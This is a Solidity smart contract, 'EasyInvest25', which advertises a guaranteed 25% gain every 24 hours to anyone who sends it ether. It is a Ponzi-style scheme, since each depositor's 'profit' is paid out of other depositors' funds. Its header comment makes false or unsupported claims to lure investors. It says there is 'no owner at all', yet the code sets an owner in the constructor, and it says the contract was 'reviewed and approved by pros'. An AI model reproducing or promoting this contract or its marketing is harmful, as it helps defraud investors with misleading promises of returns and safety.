pragma solidity ^0.4.24;
/**
 *
 * Easy Investment 25% Contract
 *  - GAIN 25% PER 24 HOURS (every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
 
contract EasyInvest25 {
    address owner;

    function EasyInvest25 () {
        owner = msg.sender;
    }
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;
    // this function called every time anyone sends a transaction to this contract
    function() external payable {
         // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0){
         // calculate profit amount as such:   
        address kashout = msg.sender;
        // amount = (amount invested) * 25% * (blocks since last transaction) / 5900
        // 5900 is an average block count per day produced by Ethereum blockchain
        uint256 getout = invested[msg.sender]*25/100*(block.number-atBlock[msg.sender])/5900;
        // send calculated amount of ether directly to sender (aka YOU)
        kashout.send(getout);
        }
        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}